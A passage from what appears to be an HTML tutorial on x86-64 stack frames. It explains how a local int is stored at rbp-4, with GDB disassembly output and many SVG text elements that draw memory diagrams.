<text text-anchor='middle' x='616' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='436' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='648' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='84' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='656' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='436' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='656' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='84' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='664' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='436' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='664' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='84' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='672' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='672' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='84' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='680' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='680' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='84' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='688' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='688' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='84' fill='currentColor' style='font-size:1em'>Y</text>
<text text-anchor='middle' x='696' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='132' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='776' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='276' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='308' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='340' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='372' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='404' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='452' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='660' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='808' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='420' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='824' y='436' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='832' y='292' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='832' y='436' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='840' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='840' y='436' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='848' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='848' y='436' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='856' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='864' y='292' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='864' y='436' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='880' y='436' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='888' y='436' fill='currentColor' style='font-size:1em'>)</text>
</g>

    </svg>
  
</div>
<p>The <code>rbp</code> register holds a memory location, you subtract 4 from the rbp to make enough space for a <code>int</code> type data and then store the value at that location.</p>
<p>After executing the instruction, we&rsquo;ll get <code>0x1</code> in this location.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; si
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; disas main
</span></span><span class="line"><span class="cl">Dump of assembler code for function main:
</span></span><span class="line"><span class="cl">   0x0000555555555119 &lt;+0&gt;:     push   rbp
</span></span><span class="line"><span class="cl">   0x000055555555511a &lt;+1&gt;:     mov    rbp,rsp
</span></span><span class="line"><span class="cl">   0x000055555555511d &lt;+4&gt;:     mov    DWORD PTR [rbp-0x4],0x1
</span></span><span class="line"><span class="cl">=&gt; 0x0000555555555124 &lt;+11&gt;:    nop
</span></span><span class="line"><span class="cl">   0x0000555555555125 &lt;+12&gt;:    pop    rbp
</span></span><span class="line"><span class="cl">   0x0000555555555126 &lt;+13&gt;:    ret
</span></span><span class="line"><span class="cl">End of assembler dump.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; p/x *(int *)($rbp-4)
</span></span><span class="line"><span class="cl">$7 = 0x1
</span></span></code></pre></div>


<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 904 681"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='48' y='372' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='56' y='372' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='56' y='388' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='56' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='452' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='64' y='372' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='64' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='80' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='420' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='88' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='420' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='88' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='372' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='96' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='420' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='96' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='104' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='104' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='112' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='112' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='120' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='120' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='128' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='152' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='420' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='160' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='420' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='168' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='420' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='176' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='420' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='388' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='420' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='208' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='216' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='420' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='496' y='436' fill='currentColor' style='font-size:1em'>7</text>
